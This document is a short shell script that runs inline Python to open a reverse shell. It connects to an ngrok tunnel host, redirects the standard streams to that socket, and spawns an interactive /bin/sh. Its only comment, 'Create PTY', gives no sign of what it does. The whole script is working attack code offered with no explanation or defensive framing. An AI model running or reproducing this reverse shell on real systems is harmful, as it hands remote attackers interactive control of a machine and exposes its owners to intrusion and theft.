#!/bin/sh
# Create PTY
python3 -c "
import pty
import os
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('0.tcp.ap.ngrok.io', 12667))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

pty.spawn('/bin/sh')
s.close()
"
